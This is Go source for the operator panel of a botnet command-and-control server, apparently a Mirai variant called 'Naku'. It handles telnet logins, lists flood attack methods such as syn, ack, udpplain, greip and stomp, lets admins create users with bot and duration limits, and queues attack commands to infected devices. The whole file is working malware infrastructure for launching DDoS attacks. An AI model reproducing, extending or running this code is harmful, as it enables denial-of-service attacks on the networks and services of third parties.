package main

import (
    "fmt"
    "net"
    "time"
    "strings"
    "strconv"
)

type Admin struct {
    conn    net.Conn
}

func NewAdmin(conn net.Conn) *Admin {
    return &Admin{conn}
}

func (this *Admin) Handle() {
    this.conn.Write([]byte("\033[?1049h"))
    this.conn.Write([]byte("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22"))

    defer func() {
        this.conn.Write([]byte("\033[?1049l"))
    }()

    this.conn.Write([]byte("\033[2J\033[1;1H"))
	this.conn.SetDeadline(time.Now().Add(60 * time.Second))
	this.conn.Write([]byte("\033[1;37m[\033[0;94mNaku\033[1;37m] \r\n"))
    this.conn.Write([]byte("\033[1;37mUsername\033[0;94m:\033[1;37m"))
    username, err := this.ReadLine(false)
    if err != nil {
        return
    }

    this.conn.SetDeadline(time.Now().Add(60 * time.Second))
    this.conn.Write([]byte("\033[1;37mPassword\033[0;94m:\033[1;37m"))
    password, err := this.ReadLine(true)
    if err != nil {
        return
    }

    this.conn.SetDeadline(time.Now().Add(120 * time.Second))
    this.conn.Write([]byte("\r\n"))

    var loggedIn bool
    var userInfo AccountInfo
    if loggedIn, userInfo = database.TryLogin(username, password); !loggedIn {
        this.conn.Write([]byte("\r\033[0;31mWrong Login \033[1;37m:/ \r\n"))
        buf := make([]byte, 1)
        this.conn.Read(buf)
        return
    }

    this.conn.Write([]byte("\r\n\033[0m"))
    go func() {
        i := 0
        for {
            var BotCount int
            if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
                BotCount = userInfo.maxBots
            } else {
                BotCount = clientList.Count()
            }

            time.Sleep(time.Second)
            	if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0;%d Connected | %s\007", BotCount, username))); err != nil {
                this.conn.Close()
                break
            }
            i++
            if i % 60 == 0 {
                this.conn.SetDeadline(time.Now().Add(120 * time.Second))
            }
        }
    }()
    this.conn.Write([]byte("\033[2J\033[1;1H"))
	this.conn.Write([]byte("\033[1;37m[+] \033[1;37mWelcome \033[0;94m"+username+"\r\n"))
    this.conn.Write([]byte("\033[1;37m[+] To \033[0;94mNaku\r\n"))
    this.conn.Write([]byte("\033[1;37m[+] Please do not share the botnet with others\r\n"))
    this.conn.Write([]byte("\033[1;37m{+] Sharing login with result in a ban\r\n"))
    this.conn.Write([]byte("\033[1;37m[+] Please do not spam\r\n"))
    this.conn.Write([]byte("\033[1;37m[+] Enjoy \033[0;94m"+username+"\033[1;37m!\r\n"))
	
    for {
        var botCatagory string
        var botCount int
        this.conn.Write([]byte("\033[0;94mNaku\033[1;37m~# \033[0;97m"))
        cmd, err := this.ReadLine(false)
        
        if cmd == "naku" || cmd == "c" || cmd == "clear" || cmd == "cls" {

    this.conn.Write([]byte("\033[2J\033[1;1H"))
	this.conn.Write([]byte("\033[1;37m[+] \033[1;37mWelcome \033[0;94m"+username+"\r\n"))
    this.conn.Write([]byte("\033[1;37m[+] To \033[0;94mNaku\r\n"))
    this.conn.Write([]byte("\033[1;37m[+] Please do not share the botnet with others\r\n"))
    this.conn.Write([]byte("\033[1;37m{+] Sharing login with result in a ban\r\n"))
    this.conn.Write([]byte("\033[1;37m[+] Please do not spam\r\n"))
    this.conn.Write([]byte("\033[1;37m[+] Enjoy \033[0;94m"+username+"\033[1;37m!\r\n"))
            continue
		}

		if cmd == "help" || cmd == "?"  {

			this.conn.Write([]byte("\033[2J\033[1;1H"))
			this.conn.Write([]byte("\033[1;37m[\033[0;94mudpplain\033[1;37m]\r\n"))
			this.conn.Write([]byte("\033[1;37m[\033[0;94mxmas\033[1;37m]\r\n"))
			this.conn.Write([]byte("\033[1;37m[\033[0;94mstd\033[1;37m]\r\n"))
			this.conn.Write([]byte("\033[1;37m[\033[0;94mvse\033[1;37m]\r\n"))
			this.conn.Write([]byte("\033[1;37m[\033[0;94mack\033[1;37m]\r\n"))
			this.conn.Write([]byte("\033[1;37m[\033[0;94mudp\033[1;37m]\r\n"))
			this.conn.Write([]byte("\033[1;37m[\033[0;94msyn\033[1;37m]\r\n"))
			this.conn.Write([]byte("\033[1;37m[\033[0;94mgreip\033[1;37m]\r\n"))
			this.conn.Write([]byte("\033[1;37m[\033[0;94mgreeth\033[1;37m]\r\n"))
			this.conn.Write([]byte("\033[1;37m[\033[0;94mstomp\033[1;37m]\r\n"))
			continue
		}
		
        if err != nil || cmd == "exit" || cmd == "quit" {
            return
        }
        
        if err != nil || cmd == "info" {
			
			this.conn.Write([]byte("\033[1;37[\033[0;94+\033[1;37] \033[0;94mCreator Rex\r\n"))
			this.conn.Write([]byte("\033[1;37mWatching everyone hurt over you is the worse\r\n"))
			this.conn.Write([]byte("\033[1;37mwanting change to help everyone, mom crying everyday\r\n"))
			this.conn.Write([]byte("\033[1;37mwishing to see her smile atleast once a day, i wish i can\r\n"))
			this.conn.Write([]byte("\033[1;37mmake herhappy, i hope she knows i love her to death and would die for her\r\n"))
			continue
        }

        botCount = userInfo.maxBots

        if userInfo.admin == 1 && cmd == "au" || cmd == "+" || cmd == "add" || cmd == "adduser" {
            this.conn.Write([]byte("\033[0;94mUsername\033[1;37m: "))
            new_un, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\033[0;94mPassword\033[0;31m: "))
            new_pw, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\033[0;94mBot Count \033[0;31m(-1 Access to All)\033[1;37m: "))
            max_bots_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            max_bots, err := strconv.Atoi(max_bots_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the bot count")))
                continue
            }
            this.conn.Write([]byte("\033[0;94mAttack Length \033[0;31m(-1 Unlimited)\033[1;37m: "))
            duration_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            duration, err := strconv.Atoi(duration_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the attack duration limit")))
                continue
            }
            this.conn.Write([]byte("\033[0;94mCooldown \033[0;31m(0 for none)\033[1;37m: "))
            cooldown_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            cooldown, err := strconv.Atoi(cooldown_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the cooldown")))
                continue
            }
            this.conn.Write([]byte("\033[0;94mUser Information: \r\nUsername: " + new_un + "\r\n\033[0;94mPassword\033[1;37m: " + new_pw + "\r\n\033[0;94mBots\033[1;37m: " + max_bots_str + "\r\n\033[0;94mContinue[1;37m? (y/N)"))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.CreateUser(new_un, new_pw, max_bots, duration, cooldown) {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to create new user. An unknown error occured.")))
            } else {
                this.conn.Write([]byte("Successfully Added " + new_un + "\033[0m\r\n"))
            }
            continue
        }

        if userInfo.admin == 1 && cmd == "bots" || cmd  == "botcount" || cmd == "b" {
		botCount = clientList.Count()
            m := clientList.Distribution()
            for k, v := range m {
                this.conn.Write([]byte(fmt.Sprintf("\033[1;37m%s <\033[0;94m%d\033[1;37m>\r\n", k, v)))
			}
				this.conn.Write([]byte(fmt.Sprintf("\033[1;37mConnected <\033[0;94m%d\033[1;37m>\r\n", botCount)))
            continue
		}
		
	    if cmd[0] == '-' {
            countSplit := strings.SplitN(cmd, " ", 2)
            count := countSplit[0][1:]
            botCount, err = strconv.Atoi(count)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1mFailed to parse botcount \"%s\"\033[0m\r\n", count)))
                continue
            }
            if userInfo.maxBots != -1 && botCount > userInfo.maxBots {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1mBot count to send is bigger then allowed bot maximum\033[0m\r\n")))
                continue
            }
            cmd = countSplit[1]
        }

        atk, err := NewAttack(cmd, userInfo.admin)
        if err != nil {
            this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
        } else {
            buf, err := atk.Build()
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
            } else {
                if can, err := database.CanLaunchAttack(username, atk.Duration, cmd, botCount, 0); !can {
                    this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
                } else if !database.ContainsWhitelistedTargets(atk) {
                    fmt.Printf("[CNC] Attack command received from admin '%s': %s (duration: %ds, max bots: %d)\n", username, cmd, atk.Duration, botCount)
                    clientList.QueueBuf(buf, botCount, botCatagory)
                } else {
                    fmt.Printf("[CNC] Attack blocked by whitelist protection for admin '%s': %s\n", username, cmd)
                    fmt.Println("Blocked attack by " + username + " to whitelisted prefix")
                }
            }
        }
    }
}

func (this *Admin) ReadLine(masked bool) (string, error) {
    buf := make([]byte, 1024)
    bufPos := 0

    for {
        n, err := this.conn.Read(buf[bufPos:bufPos+1])
        if err != nil || n != 1 {
            return "", err
        }
        if buf[bufPos] == '\xFF' {
            n, err := this.conn.Read(buf[bufPos:bufPos+2])
            if err != nil || n != 2 {
                return "", err
            }
            bufPos--
        } else if buf[bufPos] == '\x7F' || buf[bufPos] == '\x08' {
            if bufPos > 0 {
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos--
            }
            bufPos--
        } else if buf[bufPos] == '\r' || buf[bufPos] == '\t' || buf[bufPos] == '\x09' {
            bufPos--
        } else if buf[bufPos] == '\n' || buf[bufPos] == '\x00' {
            this.conn.Write([]byte("\r\n"))
            return string(buf[:bufPos]), nil
        } else if buf[bufPos] == 0x03 {
            this.conn.Write([]byte("^C\r\n"))
            return "", nil
        } else {
            if buf[bufPos] == '\x1B' {
                buf[bufPos] = '^';
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos++;
                buf[bufPos] = '[';
                this.conn.Write([]byte(string(buf[bufPos])))
            } else if masked {
                this.conn.Write([]byte("*"))
            } else {
                this.conn.Write([]byte(string(buf[bufPos])))
            }
        }
        bufPos++
    }
    return string(buf), nil
}
